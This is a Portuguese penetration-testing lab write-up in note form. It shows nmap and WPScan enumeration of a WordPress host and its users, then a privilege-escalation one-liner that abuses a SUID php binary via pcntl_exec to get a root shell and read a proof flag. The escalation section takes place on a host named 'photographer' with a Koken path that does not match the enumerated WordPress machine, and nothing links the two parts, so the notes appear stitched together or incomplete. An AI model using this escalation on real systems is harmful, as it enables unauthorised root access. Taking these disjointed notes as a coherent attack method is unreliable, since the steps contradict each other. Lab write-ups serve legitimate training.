EHPT - Web

# EHPT - Web

## Enumeração

- Iniciado enumeração inicial do host

  ```
  zurc@kali:/dcruz/ehpt/web/scan$ nmap -p22,80,443,12320,12321,12322 -A -Pn -oA full 192.168.56.60
  Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-29 17:39 -03
  Nmap scan report for 192.168.56.60
  Host is up (0.0013s latency).
  
  PORT      STATE SERVICE  VERSION
  22/tcp    open  ssh      OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 ca:fe:f7:fa:55:60:08:cb:bc:e5:1d:d4:00:4e:f0:c8 (RSA)
  |   256 be:ea:fb:4c:4a:cd:4a:ff:0c:90:e1:68:aa:e6:4f:d4 (ECDSA)
  |_  256 7a:9c:45:0f:df:22:23:2b:50:70:be:19:e3:cc:36:f4 (ED25519)
  80/tcp    open  http     Apache httpd
  |_http-generator: WordPress 5.2.7
  |_http-server-header: Apache
  |_http-title: TurnKey Linux &#8211; Just another WordPress site
  443/tcp   open  ssl/http Apache httpd
  |_http-generator: WordPress 5.2.7
  |_http-server-header: Apache
  |_http-title: TurnKey Linux &#8211; Just another WordPress site
  | ssl-cert: Subject: commonName=wordpress
  | Subject Alternative Name: DNS:wordpress
  | Not valid before: 2020-06-21T02:32:28
  |_Not valid after:  2030-06-21T02:32:28
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn: 
  |_  http/1.1
  12320/tcp open  ssl/http ShellInABox
  |_http-title: Shell In A Box
  | ssl-cert: Subject: commonName=wordpress
  | Subject Alternative Name: DNS:wordpress
  | Not valid before: 2020-06-21T02:32:28
  |_Not valid after:  2030-06-21T02:32:28
  |_ssl-date: TLS randomness does not represent time
  12321/tcp open  ssl/http MiniServ 1.881 (Webmin httpd)
  | http-robots.txt: 1 disallowed entry 
  |_/
  |_http-title: Login to Webmin
  | ssl-cert: Subject: commonName=wordpress
  | Subject Alternative Name: DNS:wordpress
  | Not valid before: 2020-06-21T02:32:28
  |_Not valid after:  2030-06-21T02:32:28
  |_ssl-date: TLS randomness does not represent time
  12322/tcp open  ssl/http Apache httpd
  |_http-server-header: Apache
  |_http-title: Login - Adminer
  | ssl-cert: Subject: commonName=wordpress
  | Subject Alternative Name: DNS:wordpress
  | Not valid before: 2020-06-21T02:32:28
  |_Not valid after:  2030-06-21T02:32:28
  |_ssl-date: TLS randomness does not represent time
  | tls-alpn: 
  |_  http/1.1
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
  
  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 40.45 seconds
  
  ```

### 80/TCP e 443/TCP

- Notado de que se trata de um website executando Wordpress. Ao executar o WPScan, encontrada a versão 5.2.7 e os seguintes usuários

  ```
  [i] User(s) Identified:
  
  [+] admin
   | Found By: Author Posts - Display Name (Passive Detection)
   | Confirmed By:
   |  Rss Generator (Passive Detection)
   |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
   |  Login Error Messages (Aggressive Detection)
  
  [+] elliot
   | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
   | Confirmed By: Login Error Messages (Aggressive Detection)
  
  ```

- Uma vez que o wordpress não é uma versão vulnerável e nao possui nenhum tema e plugin vulneravel, decido seguir adiante

### 

- escalação e flag

  ```
  www-data@photographer:/var/www/html/koken/storage/originals/01/5f$ /usr/bin/php7.2 -r "pcntl_exec('/bin/sh',['-p']);" 
  .2 -r "pcntl_exec('/bin/sh',['-p']);"
  # id
  id
  uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
  # cd /root
  cd /root
  # dir
  dir
  proof.txt
  # cat proof.txt
  cat proof.txt
  1a268910498cb923cd412f7b49c03621
  # 
  
  ```